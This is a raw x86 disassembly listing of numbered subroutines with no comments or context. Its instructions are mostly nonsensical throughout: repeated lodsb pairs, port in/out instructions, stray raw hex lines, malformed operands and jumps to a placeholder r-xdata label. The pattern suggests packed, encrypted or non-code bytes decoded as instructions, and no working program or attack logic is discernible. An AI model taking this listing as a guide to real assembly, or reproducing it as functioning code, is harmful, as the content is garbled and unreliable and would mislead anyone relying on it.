fdivr [ edi - 0x5351ae46 ]
lodsb [ esi ]
pop esp
salc
push ebp
pop edx
push ebx
push ebx
fsub [ ebx ]
outsd
push eax
mov [ 0x16036dd2 ] eax
push ebx
push ebx
mov edx 0x5353400c
retn
sub_47dcb9
mov ebx 0x53537702
salc
xchg ebx eax
pop esp
xlat
sub al 0x50
push ebx
push ebx
ficomp [ esi ]
out 0xde eax
push ss
idiv [ ebx + 0x5353776d ]
salc
xchg ebx eax
pop esp
xlat
aas
push eax
push ebx
push ebx
mov edx 0x53537964
retn
sub_47ddf9
cmp [ edx + ebx * 8 - 0x3a5350d2 ] ebp
fist [ ebx + 0x53 ]
push ebx
push 0x2e
scasd [ edi ]
pop esp
xlat
jns r-xdata
add al 0xda
adc eax 0xbb31bb4b
lodsb [ esi ]
lodsb [ esi ]
mov edx 0xacaca8dd
retn
push ebx
push ebx
add al 0x39
push edi
ficom [ esi ]
stosd [ edi ]
add edi [ ecx ]
dec ebp
cmp [ edx + ebx * 8 - 0x3a5354d2 ] ebp
fist [ ebx + 0x53 ]
push ebx
mov edx 0xacaca645
retn
sub_47df09
xor eax 0xd81106da
mov cl [ ecx ]
xor eax 0x35b50eda
fisubr [ esi ]
movsd [ edi ] [ esi ]
xor eax 0x390f06da
cmp cl [ ecx ]
cmp [ 0xd06da35 ] edi
or [ ecx ] edi
aaa
xor eax 0x93306da
cmp [ ecx ] esi
xor eax 0x93106da
mov edx 0xacaca7b3
retn
sub_47df58
mov ebx 0xacacbf69
rcl [ edi - 0x588c45a1 ] 0x1
lodsb [ esi ]
lodsb [ esi ]
or [ 0x39530eda ] dh
cmp eax 0xda3589d8
push cs
push ecx
or [ 0x39570eda ] dh
or [ gs : 0x39550eda ] dh
or [ bp + si + 0x5777 ] bh
push ebx
push ebx
retn
sub_47df96
fdivr [ edi + 0x60000202 ]
mov [ 0xffffffffd75ca868 ] al
cdq
pop ebp
push ebx
push ebx
push 0xe
pop ebx
pop esp
xlat
xchg edx eax
pop ebp
push ebx
push ebx
push 0xe
pop edi
pop esp
xlat
jmp r-xdata
jpe r-xdata
push ebx
push ebx
pushad
0x49b7812 0x2fd8
ja r-xdata
push ebx
push ebx
retn
xchg ecx eax
jae r-xdata
fiadd [ edi + 0x52 ]
shl [ ecx + 0x6947d95c ] 0x1
arpl [ ebx + 0x13 ] ax
sbb eax 0xacbad65c
lodsb [ esi ]
lodsb [ esi ]
mov edx 0x53535275
retn
shr [ ebx + 0x58d65c52 ] 0x1
jne r-xdata
fiadd [ edi + 0x22 ]
mov edx 0x535378af
retn
retn
push ebx
mov edx 0x535376ac
retn
sub_47dfc7
ficom [ esi ]
jecxz r-xdata
fild [ esi + 0x4bbbacac ]
inc ebp
push ebx
push ebx
or cl [ edx ]
salc
xchg ebx eax
pop esp
salc
xor al 0xae
lodsb [ esi ]
lodsb [ esi ]
ficom [ esi ]
mov [ ebx ] 0x537393ba
push ebx
salc
mov [ edi + edx * 8 - 0x20 ] bl
mov ebp 0x26acacac
scasd [ edi ]
add al 0xac
add eax 0xaedfdede
lodsb [ esi ]
lodsb [ esi ]
mov ebx 0x5353454b
sub_47e003
xor eax 0xba536ad0
push es
mov [ 0xffffffff8dd8acac ] eax
xor eax 0xbaa90eda
jpe r-xdata
push ebx
push ebx
pushad
0x49b7812 0x2fd8
ja r-xdata
push ebx
push ebx
retn
xchg ecx eax
jae r-xdata
fiadd [ edi + 0x52 ]
shl [ ecx + 0x6947d95c ] 0x1
arpl [ ebx + 0x13 ] ax
sbb eax 0xacbad65c
lodsb [ esi ]
lodsb [ esi ]
mov edx 0x53535275
retn
shr [ ebx + 0x58d65c52 ] 0x1
jne r-xdata
fiadd [ edi + 0x22 ]
mov edx 0x535378af
retn
retn
push ebx
mov edx 0x535376ac
retn
sub_47e089
pop esp
xlat
sbb dl [ edx + 0x53 ]
push ebx
pushad
0x49b7812 0x2fd8
ja r-xdata
xchg ecx eax
jae r-xdata
fiadd [ edi + 0x52 ]
shl [ ecx + 0x6947d95c ] 0x1
arpl [ ebx + 0x13 ] ax
sbb eax 0xacbad65c
lodsb [ esi ]
lodsb [ esi ]
mov edx 0x53535275
retn
shr [ ebx + 0x58d65c52 ] 0x1
jne r-xdata
fiadd [ edi + 0x22 ]
mov edx 0x535378af
retn
retn
push ebx
mov edx 0x535376ac
retn
sub_47e0d7
mov ebx 0x53534411
pushad
movsd [ edi ] [ esi ]
salc
xchg ebx eax
pop esp
xlat
sbb al 0x7b
push ebx
push ebx
add al 0x5c
in al 0x47
and bl dh
sub esp ebp
shr [ edx + ecx * 2 + 0x5350d45c ] 0x1
push ebx
push ebx
rcl [ ecx + 0x47da3573 ] 0x1
and bh [ edx + 0x535378af ]
retn
sub_47e10a
xor eax 0xd75c5268
adc cl [ edx - 0x1f455354 ]
jo r-xdata
lodsb [ esi ]
retn
push ebx
lodsb [ esi ]
in al 0x97
push ebx
push ebx
push ebx
mov ebx 0xacacb163
mov edx 0x535357ab
retn
sub_47e24d
pop esp
salc
enter 0xacac 0xac
cmp [ ebx + ecx ] edi
cmp [ ebx ] esp
xor eax 0xb8316da
cmp [ esi ] esi
xor eax 0xb8116da
cmp [ 0xffffffff8716da35 ] edi
or edi [ ecx ]
daa
xor eax 0x608516da
xchg ebx eax
xor eax 0xb8b16da
mov edx 0xacac88ea
retn
sub_47e313
cmp [ ebx - 0x22 ] eax
push ss
add [ 0xffffffffbb2bbb03 ] 0xffffffac
lodsb [ esi ]
add eax 0x3a4ea23b
adc ebp [ esp + 0x53535397 ]
mov edx 0x535374da
pop esp
xlat
insb
mov ch 0xac
lodsb [ esi ]
mov edx 0x535378f4
retn
sub_47e3f5
fcomp st6
fwait
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add ebp [ ebp + eax + 0x430e6b7f ]
pop esp
salc
mov al 0x76
push ebx
push ebx
mov edx 0x535378be
retn
sub_47e4a1
pop esp
salc
insb
mov ecx 0x14deacac
push edx
add ebx [ ebp + 0x54 ]
add edx edx
xchg esp eax
cdq
push ebx
push ebx
push ebx
fcomp st7
ja r-xdata
in eax 0x54
push ecx
push ebx
push ebx
add al 0xba
fldenv [ edx - 0x3c3c5354 ]
retn
sub_47e528
xor eax 0x60a516da
xchg ebx eax
cmp [ edi ] edx
xor eax 0xdeab16da
push ss
xlat
add eax 0xb50abb03
lodsb [ esi ]
lodsb [ esi ]
mov edx 0xacacae83
fcom [ esi ]
pop ebx
fsub [ ebx ]
outsd
push eax
mov [ 0x4715e45c ] eax
rcl [ edi + 0x6317de5f ] 0x1
dec ebx
mov edx 0x535347af
retn
sub_47e5c3
or bh [ ecx ]
jbe r-xdata
retn
xchg edx eax
xor eax 0xb8716da
cmp [ eax ] esp
mov edx 0xacaca83d
pushad
lodsb [ esi ]
xor eax 0xcb12eda
xor eax 0x39bb2eda
mov edx 0x5353472f
retn
sub_47e5fa
rcl [ edi + 0x5c8dba43 ] 0x1
push ebx
push ebx
cmp [ edx ] esi
or edi [ ecx ]
and eax 0xa316da35
or edi [ ecx ]
and esi [ 0xba116da ]
cmp [ ebp + 0x35 ] edi
ficom [ esi ]
cmpsd [ esi ] [ edi ]
or edi [ edx - 0x53534826 ]
retn
sub_47e6f4
pop ebx
rcl [ ebx + 0x53 ] cl
push ebx
fcom st5
out dx eax
push ebx
push ebx
push ebx
cmp dl [ ebx + 0x535353d7 ]
push eax
aad 0x93
push ebx
push ebx
push ebx
mov edx 0x535341f7
fcomp [ ebp - 0x577f7328 ]
rcl [ ebp - 0x3e45eea5 ] 0x1
dec ebp
push ebx
push ebx
retn
sub_47e785
fcomp st6
das
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add esp [ eax - 0x5b ]
add eax 0xd61f04ac
xchg ebx eax
pop esp
xlat
mov edx 0xbaacac8a
fild [ ebx + 0x53 ]
push ebx
retn
sub_47e7d6
add edi [ ecx ]
push ecx
cmp ecx [ ebp - 0x530f7bc2 ]
in al 0x9f
push ebx
push ebx
push ebx
mov ebx 0xacac8839
rcl [ edi + 0x5c93d647 ] 0x1
xlat
mov [ esi + 0x2ed0acac ] esp
scasd [ edi ]
push edi
pop esp
fild [ ebx - 0x2753535a ]
sbb edx [ edi + 0x5c ]
in al 0x5a
shr [ edx - 0x5629a39e ] 0x1
mov edx 0x23acacac
pop edi
mov edx 0x535351ce
retn
sub_47e871
add [ edi + 0x5ac4b77 ] ch
daa
mov ebx 0x53534b8d
salc
xchg ebx eax
pop esp
salc
push esp
push ebx
push ebx
push ebx
add [ ebp + eax * 8 + 0x535353ff ] ch
fimul [ edi ]
ja r-xdata
retn
mov ebx 0x535374de
pushad
lodsb [ esi ]
adc al 0xba
popad
mov ebp [ esp + ebp * 4 - 0x3c3c3c3d ]
retn
sub_47e976
mov ebx 0xacacbfe8
or bl dl
push ss
scasd [ edi ]
push 0x5ad75c90
js r-xdata
mov edx 0x5353466f
retn
push ebx
mov ebx 0x535340fb
fcomp [ esi ]
pop ebx
mov edx 0x53535250
retn
sub_47e996
mov ebx 0xacacb692
or dl dh
xchg ebx eax
pop esp
salc
stc
mov [ 0x573bacac ] eax
push edx
push ebx
push ebx
fcomp st6
[ edi ]
lodsb [ esi ]
lodsb [ esi ]
add eax [ eax ]
lodsb [ esi ]
add al 0x1f
salc
xchg ebx eax
pop esp
xlat
fsub [ ebx + 0x1739acac ]
ficom [ esi ]
sti
mov edx 0x53534b58
retn
sub_47ea59
cmp [ edi ] esp
mov edx 0x53534c9c
fcomp [ edx ]
stosd [ edi ]
push eax
push ds
cmpsd [ esi ] [ edi ]
push eax
push ss
pop ebx
add bh [ edx + 0x53534372 ]
add eax 0x5733905
add eax 0x85aeba05
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47eb18
push edx
pop ss
ja r-xdata
retn
lodsb [ esi ]
pop ss
ja r-xdata
push ebx
push ebx
retn
fcom [ edi ]
ja r-xdata
fiadd [ esi ]
out dx eax
or [ ecx ] edi
xor [ 0x9ed06da ] esi
cmp [ esi + 0x99306da ] edi
cmp [ ebx ] ebp
xor eax 0x99106da
cmp [ 0xffffffff9706da35 ] esp
pushad
xor [ 0x99506da ] 0xda353a39
push es
mov ebx 0x35213909
fiadd [ esi ]
mov ecx 0x9de3ba09
lodsb [ esi ]
lodsb [ esi ]
retn
push 0xd15c4b10
outsb
xchg [ esp + ebp * 4 - 0x5845532a ] ch
cwde
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47eb40
fiadd [ esi ]
stosd [ edi ]
fcom [ esi ]
scasd [ edi ]
ficom [ esi ]
mov bh 0xd8
push ss
stosd [ edi ]
ficom [ esi ]
mov ebx 0xbaa716d8
clc
mov edi 0xc3c3acac
retn
sub_47eb72
xor eax 0x9ef06da
cmp [ ecx ] esi
xor eax 0x9ed06da
cmp [ esi + 0x99306da ] edi
cmp [ ebx ] ebp
xor eax 0x99106da
cmp [ 0xffffffff9706da35 ] esp
pushad
xor [ 0x99506da ] 0xda353a39
push es
mov ebx 0x35213909
fiadd [ esi ]
mov ecx 0x9de3ba09
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47ebf2
salc
xchg ebx eax
pop esp
salc
sbb eax 0xbaacaca2
fwait
mov al [ 0x3fbbacac ]
push esi
push ebx
push ebx
fiadd [ esi ]
cmpsd [ esi ] [ edi ]
mov ebx 0x53535637
mov edx 0x53534024
retn
sub_47ec3c
push 0xd75cab16
mov ebx 0xd8535355
push ss
scasd [ edi ]
fstp [ esi ]
pop edi
fistp [ ebx - 0x28 ]
push ss
scasd [ edi ]
adc ebx edx
push ss
scasd [ edi ]
mov edx 0xacac88e3
retn
sub_47edc0
fbstp [ edi - 0xd ]
push ecx
push ebx
push ebx
add al [ ebx ]
fcom [ ebp + 0x5357feba ]
push ebx
shr [ edi ] 0x1
ja r-xdata
inc eax
push ebx
push ebx
mov edx 0x53535d41
retn
push ebx
pop esp
salc
test al 0x54
push ebx
push ebx
cmp edx [ edi + 0x52 ]
push ebx
push ebx
fcomp st7
ja r-xdata
nop
lodsb [ esi ]
jecxz r-xdata
push ebx
push ebx
push ebx
add edi [ edx - 0x53537d3c ]
xor eax 0xd8190eda
mov esi [ 0xffffffffd81f0eda ]
mov dh [ 0xffffffffba1d0eda ]
or [ ebp + 0x53 ] edx
push ebx
fmul [ ebx + 0x535086ba ]
push ebx
push eax
push ebx
push edx
push ebx
push ebx
fcomp st3
push ebx
push edx
push ebx
push ebx
lodsb [ esi ]
daa
ja r-xdata
retn
mov edi [ edx + 0x53535086 ]
ficomp [ edi ]
ja r-xdata
sub_47ee9e
add [ ecx ] bh
dec ecx
add [ ebp + eax * 8 + 0x535353b3 ] ch
fadd [ esi ]
pop ebx
fcomp st6
fwait
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
mov ebx 0x535351e9
add ebx esi
fsubrp st7
stosd [ edi ]
lodsb [ esi ]
lodsb [ esi ]
mov ebx 0xacac9c99
or dl al
stosd [ edi ]
push edx
mov edx 0xacaca92d
retn
sub_47ef14
shr [ edi + edx * 2 ] 0x1
push ebx
pop esp
aad 0xb1
mov [ esp + ebp * 4 + 0x777737d0 ] ebp
push ebx
ficom [ edi ]
ja r-xdata
or cl [ edx ]
fimul [ esi ]
scasd [ edi ]
salc
mov [ edi + edx * 8 - 0x76 ] bl
test [ esp + ebp * 4 + 0x533b5739 ] ebp
arpl [ ebx + 0x53 ] dx
cmp edx [ ebx + 0x52 ]
push ebx
push ebx
cmp [ ebx - 0x54 ] edx
sbb al 0xa3
salc
movsd [ edi ] [ esi ]
pop esp
xlat
in al dx
test [ esp + ebp * 4 - 0x77710c5 ] ebp
out dx al
add al 0xba
sbb eax 0xc3acacb3
retn
add ebx [ esp + 0x54 ]
add esi [ 0x355114d8 ]
push eax
pop ss
ja r-xdata
mov edx 0xacacb34c
retn
mov edx 0xacac8e33
retn
sub_47ef8b
pop esp
xlat
mov al [ 0x3bacac85 ]
jno r-xdata
mov edx 0xacac8a7f
retn
in al dx
fld [ ebx + edi * 4 ]
imul eax [ esp + ebp * 4 + 0xa8bd8ac ] 0xa
fimul [ esi ]
scasd [ edi ]
salc
mov [ edi + edx * 8 - 0x76 ] bl
test [ esp + ebp * 4 + 0x533b5739 ] ebp
arpl [ ebx + 0x53 ] dx
cmp edx [ ebx + 0x52 ]
push ebx
push ebx
cmp [ ebx - 0x54 ] edx
sbb al 0xa3
salc
movsd [ edi ] [ esi ]
pop esp
xlat
in al dx
test [ esp + ebp * 4 - 0x77710c5 ] ebp
out dx al
add al 0xba
sbb eax 0xc3acacb3
retn
sub_47f10a
shr [ esi ] 0x1
pop ebx
push ebx
pop esp
xlat
scasd [ edi ]
pop eax
push ebx
push ebx
fcomp st6
mov [ 0xffffffffbbacaca8 ] eax
cmp [ edx + 0x1ed8acac ] ebp
pop ebx
mov edx 0xacacb499
retn
sub_47f14a
pop es
cmpsd [ esi ] [ edi ]
lodsb [ esi ]
lodsb [ esi ]
fcom [ 0xffffffffab26ac67 ]
ficom [ esi ]
sbb esi 0x16
cmp [ edx + 0x53535215 ] 0xffffffac
daa
ja r-xdata
mov [ edi + edx * 8 + 0x7e ] bl
xchg [ esp + ebp * 4 - 0x5375a646 ] ebp
lodsb [ esi ]
retn
lodsb [ esi ]
add eax 0x7717d827
inc ebx
mov edx 0xacacaafa
retn
sub_47f19f
mov ebx 0xacac8d01
or dl al
stosd [ edi ]
push ecx
pop esp
aad 0x6c
inc eax
push ebx
push ebx
pop esp
in al 0x59
in al dx
or [ ebx + edx * 2 ] esp
push ebx
xor eax 0xd75c9c68
jpo r-xdata
retn
push ebx
push ebx
mov edx 0x53534046
retn
sub_47f1c5
fcomp st6
out dx eax
test eax 0xbb03acac
jb r-xdata
xor eax 0x8fb0eda
xor eax 0xd8f90eda
mov bh [ edx + 0x53534b07 ]
adc al 0xd0
lodsb [ esi ]
push eax
pop esp
shl [ ebx - 0x4553534a ] 0x1
xor al [ eax - 0x3c3c5354 ]
retn
push ebx
push ebx
rcl [ edi - 0x45ffff8d ] 0x1
aas
fwait
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47f1ed
0xc3c3c390 0xd75c
pop es
mov ecx 0x15baacac
mov ecx 0xc3c3acac
add al dl
xchg edx eax
push ecx
add al 0xba
mov bl 0x8d
lodsb [ esi ]
lodsb [ esi ]
cmp [ edi ] esp
xor eax 0x8f50eda
cmp [ eax ] esp
xor eax 0x8fb0eda
xor eax 0xd8f90eda
mov bh [ edx + 0x53534b07 ]
adc al 0xd0
lodsb [ esi ]
push eax
pop esp
shl [ ebx - 0x4553534a ] 0x1
xor al [ eax - 0x3c3c5354 ]
retn
sub_47f36b
xlat
push ebx
push ebx
push ebx
add [ esi - 0x7fe5454d ] ch
lodsb [ esi ]
lodsb [ esi ]
pop esp
in al 0x93
add ebx eax
xchg ebp eax
mov edx 0xacac96b3
retn
sub_47f3cf
fcomp [ esi ]
scasd [ edi ]
mov edx 0x53535a19
cmp edx [ edx + 0x53 ]
push ebx
rcr edx cl
push cs
inc ebx
lodsb [ esi ]
les ebp [ ebx - 0x29acacad ]
xchg ebx eax
pop esp
salc
leave
xchg ebp eax
lodsb [ esi ]
lodsb [ esi ]
lodsb [ esi ]
pop edi
mov edx 0x53534ea5
retn
sub_47f4c4
0xda350a90 0xe10e
xor eax 0x39951eda
cmp bl al
lea ecx [ edx ]
xor eax 0xd8e70eda
mov esi [ 0x358316da ]
ficomp [ esi ]
fwait
fcomp [ ebx - 0x25ca6ca0 ]
push cs
in eax 0xba
and eax [ eax - 0x3c3c5354 ]
retn
sub_47f517
or al dl
xchg esi eax
daa
0xc3c3c390 0x35c3
ficomp [ esi ]
xchg [ edx ] ecx
cmp [ ebx ] ebp
xor eax 0xa851eda
cmp [ edx ] esi
xor eax 0xa8b1eda
cmp [ esi - 0x4576e126 ] esi
mov dl 0xa0
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47f5ef
push es
fdivr [ edi + 0x515bbfd2 ]
push ebx
push ebx
fcomp st6
stosd [ edi ]
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
mov ebx 0xacaca7d5
fadd [ esi ]
pop edi
mov ebx 0xacaca836
add ebp [ esi - 0x696845a5 ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47f7c5
xor eax 0xbab30eda
or al 0x46
push ebx
push ebx
pop esp
xlat
dec ecx
mov ecx 0xd6deacac
fwait
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add eax [ eax ]
mov edx 0xacaca5ee
retn
sub_47f7f5
pushad
mov [ esi + edx * 8 ] al
movsd [ edi ] [ esi ]
pop esp
fst [ ebp + 0x51 ]
push ebx
push ebx
fsubr st3
xchg ebx eax
push ebx
push ebx
push ebx
fcomp [ edi ]
ja r-xdata
retn
fadd [ ebx + edi * 4 - 0x53537524 ]
mov edx 0x5353528a
retn
sub_47f92d
add eax 0xac8137bb
lodsb [ esi ]
rcl [ edi + 0x770f6a5f ] 0x1
inc edi
pop esp
xlat
pop ebx
push ebx
push ebx
push ebx
cmp ecx ebx
imul edx [ ebx + 0x53 ] 0xbb5b05ac
mov [ edx - 0x54275354 ] dl
mov edx 0xacac83b6
retn
sub_47f9ef
salc
xchg ebx eax
pop esp
xlat
lds esp [ ebp - 0x2def5354 ]
xchg esp eax
xlat
push ebx
push ebx
push ebx
push 0x53df5c8d
lodsd [ esi ]
lodsb [ esi ]
lodsb [ esi ]
pushad
xchg ebx eax
mov edx 0x535354ae
retn
sub_47fa62
or al 0x35
fisubr [ esi ]
mov ecx 0x7ba3b39
push ebp
push ebx
push ebx
shr [ eax - 0x3929a354 ] 0x1
stosb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
pushad
xchg ebx eax
mov edx 0xacaca9db
retn
sub_47fad3
push ebx
fcom st5
out dx eax
push ebx
push ebx
push ebx
fcomp st5
xchg ebx eax
push ebx
push ebx
push ebx
cmp dl [ ebx + 0x535353d7 ]
mov edx 0x53535f4a
retn
sub_47faf5
pop esp
xlat
inc ax
push ebx
push ebx
add al 0xde
fcomp st7
test al 0xac
lodsb [ esi ]
fcomp st6
fild [ esi + 0x2fbbacac ]
mov esp 0x9cbaacac
xchg esp eax
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47fc69
pop esp
sar [ ecx + ebp * 4 - 0x54 ] 0x1
lodsb [ esi ]
or eax 0xba0c94d8
adc [ esp + ebp * 4 + 0x6c3c3ac ] al
fdivr [ edi + 0x57dfbfd2 ]
push ebx
push ebx
add eax 0x3babd804
push edi
push edx
push ebx
push ebx
mov edx 0xacacb9a7
pushad
xchg ebx eax
adc ebx [ edx - 0x6cc73c70 ]
pop ecx
ficom [ edi ]
inc ebx
cmp [ edx - 0x53534e3c ] 0xffffffde
ficomp [ ebx - 0x45535352 ]
mov edx [ ebp - 0x25ca5354 ]
push es
arpl [ ecx ] di
sub cl [ ecx ]
mov edx 0x535353b7
retn
sub_47fcd7
cmp [ ebx + ecx ] edi
cmp [ ebx ] esp
xor eax 0x6f7717da
or edi [ ecx ]
xor eax 0x6d7717da
or edi [ ecx ]
cmp eax 0x7717da35
adc ecx [ ebx ]
cmp [ edx + 0x35 ] edx
ficom [ edi ]
ja r-xdata
retn
pushad
xchg ebx eax
mov edx 0xacac8116
retn
sub_47fd9e
xor eax 0xba6106da
cmp eax 0x5cacacae
xlat
scasb [ edi ]
pop edi
push ebx
push ebx
pop esp
in al 0x42
mov edx 0xacaca719
add edi [ ecx ]
dec esp
mov edx 0xacacb36f
retn
sub_47fe1c
add al 0xec
jg r-xdata
mov ebx 0xacac9b0d
cmp ebp [ ebx + 0x41a6c9f ]
ficom [ 0xffffffff9b03bb57 ]
lodsb [ esi ]
lodsb [ esi ]
mov edx 0x53535eea
fadd [ ebx - 0x48f925cb ]
or [ ecx ] edi
jae r-xdata
push ebx
push ebx
add al 0xde
salc
xchg [ esi + 0x8baacac ] ebp
fwait
lodsb [ esi ]
lodsb [ esi ]
retn
push ss
lodsb [ esi ]
push ebx
mov edx 0x53534013
retn
ficomp [ esi ]
mov ebx 0xacefd0ba
lodsb [ esi ]
retn
sub_47fe6b
add edi [ edx - 0x53534708 ]
mov ebx 0xacac9b0d
cmp ebp [ ebx + 0x41a6c9f ]
ficom [ 0xffffffff9b03bb57 ]
lodsb [ esi ]
lodsb [ esi ]
mov edx 0x53535eea
fadd [ ebx - 0x48f925cb ]
or [ ecx ] edi
jae r-xdata
push ss
lodsb [ esi ]
push ebx
mov edx 0x53534013
retn
ficomp [ esi ]
mov ebx 0xacefd0ba
lodsb [ esi ]
retn
sub_47fea1
or cl [ edx ]
push 0x16
stosd [ edi ]
pop esp
fbstp [ eax - 0x5a ]
lodsb [ esi ]
lodsb [ esi ]
cmp edx [ ebx + 0x43 ]
push ebx
push ebx
ficom [ esi ]
mov [ 0xeda0403 ] eax
mov [ 0xffffffffac9a00bb ] eax
lodsb [ esi ]
rcl [ edi - 0x682f45a1 ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47fed6
cmp [ ebx + 0x56883856 ] dl
xchg ebp eax
push edi
pushad
cmp ebx eax
push cs
scasd [ edi ]
fmul [ eax + 0x50 ]
sbb dl 0xf
arpl [ eax + 0x35 ] bx
push 0xa5d65c82
mov al 0xac
lodsb [ esi ]
fmul [ esi ]
stosd [ edi ]
pop esp
in al 0x16
inc ebx
mov edx 0x5353596c
retn
sub_47ff2b
lodsb [ esi ]
cmpsd [ es : esi ] [ edi ]
mov edx 0xacac9b9a
xor eax 0x531528d0
fisubr [ edi + 0x50 ]
pop esp
xlat
inc esi
push ebx
push ebx
push ebx
shr [ edi ] 0x1
ja r-xdata
salc
mov ebx 0xbaacacaf
cmp [ eax + 0xc3acac ] dh
cmp [ eax + eax - 0x54 ] edx
les esi [ ebx - 0x29acacad ]
xchg ebx eax
pop esp
salc
add [ eax + 0xf39acac ] 0xb
xor eax 0x604316da
xchg ebx eax
cmp [ ebp + 0x35 ] edi
ficom [ esi ]
inc ecx
or edi [ ecx ]
and eax 0xa716da35
or esi [ 0x39a516da ]
xor [ ebx ] ecx
mov edx 0xacac85f1
retn
push edx
pop esp
xlat
pop ecx
push ebx
push ebx
push ebx
shr [ ebx + esi * 2 ] 0x1
push edx
pop esp
salc
mov cl 0x88
lodsb [ esi ]
lodsb [ esi ]
shr [ edi + ecx * 2 ] 0x1
push edx
mov edx 0x53535b39
retn
sub_47ff88
lodsb [ esi ]
pop ebx
fcomp st6
mov ebx 0xbaacacaf
cmp [ eax + 0xc3acac ] dh
cmp [ eax + eax - 0x54 ] edx
les esi [ ebx - 0x29acacad ]
xchg ebx eax
pop esp
salc
add [ eax + 0xf39acac ] 0xb
xor eax 0x604316da
xchg ebx eax
cmp [ ebp + 0x35 ] edi
ficom [ esi ]
inc ecx
or edi [ ecx ]
and eax 0xa716da35
or esi [ 0x39a516da ]
xor [ ebx ] ecx
mov edx 0xacac85f1
retn
sub_47ffd5
shr [ edi ] 0x1
ja r-xdata
retn
push ebx
ficom [ edi ]
ja r-xdata
retn
pop esp
xlat
push edi
push ebx
push ebx
push ebx
add al 0xac
add eax 0x10e45c5b
jg r-xdata
retn
salc
xchg ebx eax
mov edx 0xacac811f
retn
sub_480050
fist [ esi ]
out 0xdb eax
push ss
mov bh 0xdb
push ss
xchg edi eax
fist [ esi ]
xchg esi ebx
push ds
mov ebx 0x94fb16de
push ss
mov ebx 0x181e0518
mov edx 0xacaca67e
lodsb [ esi ]
pop ebx
fisubr [ esi ]
stosd [ edi ]
lodsb [ esi ]
add eax 0xd08bd86b
test al 0xac
mov edx 0x53535db7
cmp [ 0x353e390b ] esp
ficom [ esi ]
lahf
or edi [ ecx ]
cmp al 0x9
cmp [ esi ] esp
xor eax 0x359d16da
ficom [ esi ]
sbb eax 0xffffff91
xor eax 0xba8116da
insb
mov esp 0xc3c3acac
retn
sub_4800c2
or al 0x35
fisubr [ esi ]
mov edi 0x350c3439
fisubr [ esi ]
mov ebp 0x350c3539
fisubr [ esi ]
mov [ 0xffffffffda35add8 ] eax
mov eax [ cs : 0xffffffffda35aad8 ]
cmpsd [ cs : esi ] [ edi ]
fsubr [ ebp - 0x5ad125cb ]
fsubr [ ebx - 0x54d125cb ]
cmp [ 0xffffffffda35add8 ] eax
test eax 0xda35ac60
scasd [ edi ]
or al 0xba
pushad
cmpsb [ esi ] [ edi ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_480130
add eax [ esp + edx * 4 ]
push ss
mov edi 0x2a233c30
xchg esp eax
push ss
mov [ 0x73317c73 ] eax
xchg esp eax
push ss
cmpsd [ esi ] [ edi ]
jno r-xdata
retn
aas
and [ esi + edx + 0x717371ab ] dl
jbe r-xdata
xor eax 0xd8a52eda
stosd [ edi ]
xor eax 0x39ab2eda
add eax 0xda35add8
test eax 0xda35ac60
scasd [ edi ]
or al 0xba
pushad
cmpsb [ esi ] [ edi ]
lodsb [ esi ]
lodsb [ esi ]
retn
push ss
scasd [ edi ]
aas
and [ ecx + 0x53 ] dh
mov edx 0xacacbd4f
retn
sub_480177
add al 0xda
adc eax 0x9607bb0b
lodsb [ esi ]
lodsb [ esi ]
cmp ebx [ eax + edi * 4 - 0x25fb4295 ]
adc eax 0x9615bb0f
lodsb [ esi ]
lodsb [ esi ]
cmp ebx [ esi - 0x456ad861 ]
mov ebp edx
lodsb [ esi ]
lodsb [ esi ]
retn
sub_4801a6
out 0x83 al
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
salc
xchg ebx eax
mov edx 0xacaca690
js r-xdata
retn
ja r-xdata
out dx eax
lodsb [ esi ]
lodsb [ esi ]
retn
sbb edx [ eax - 0x3c3c3c3d ]
retn
sub_480216
xor eax 0x3ba916da
push edi
push edx
push ebx
push ebx
fcomp st6
xlat
test al 0xac
lodsb [ esi ]
add ebx eax
push ss
pop ebx
lodsb [ esi ]
add esi [ edi - 0x2a ]
xchg ebx eax
mov edx 0xacacab91
retn
sub_48025f
sti
push ebx
push ebx
push ebx
salc
xchg ebx eax
pop esp
xlat
xor [ eax + 0x36d0acac ] cl
scasd [ edi ]
push ebx
ficomp [ esi ]
scasd [ edi ]
add bh [ edx - 0x535349f3 ]
retn
sub_4802c5
add ebx esi
salc
mov edi 0xbaacacae
mov al [ 0x5cacac97 ]
in al 0x54
add esi [ 0x355114d8 ]
push eax
pop ss
ja r-xdata
ficom [ esi ]
mov edi 0x3525390b
ficom [ esi ]
mov ebp 0xa99dba0b
lodsb [ esi ]
lodsb [ esi ]
retn
pop esp
in al 0x93
add edi [ edx - 0x53534dd5 ]
retn
sub_48038c
add esi [ 0xb7717da ]
lodsb [ esi ]
lds esi [ edi + 0x3b535353 ]
push ebx
rcl [ ebx + 0x53 ] cl
cmp [ ebx - 0x54 ] edx
daa
ja r-xdata
push esp
push ebx
push edx
push ebx
mov edx 0xacac927c
retn
lodsb [ esi ]
add eax 0x14e55c27
push edi
mov edx 0x53535516
retn
sub_4803c8
add ebx edx
fninit
push ebx
push ebx
push ebx
lodsb [ esi ]
mov ebx 0x53d7c4ac
push ebx
push ebx
pushad
xchg ebx eax
mov edx 0x53535ccc
retn
sub_4803fc
daa
jae r-xdata
cmp eax 0xeb169405
push ds
push ds
or esi [ esi ]
xchg esp eax
push ss
out dx eax
cmp eax 0xba1e1e05
sub [ esp + ebp * 4 + 0x3b5739ac ] al
push ebx
arpl [ ebx + 0x53 ] dx
in al dx
push esi
push ebx
push ebx
pop ebx
add al 0x0
mov edx 0xacacef94
retn
and eax 0x5971694
push ds
and al 0x32
xchg esp eax
push ss
fwait
and [ esi ] esi
add eax 0x9f16941e
and al 0x32
and [ esi ] esi
xchg esp eax
push ss
out 0xb eax
cmp eax 0xeb169405
sub_480467
push es
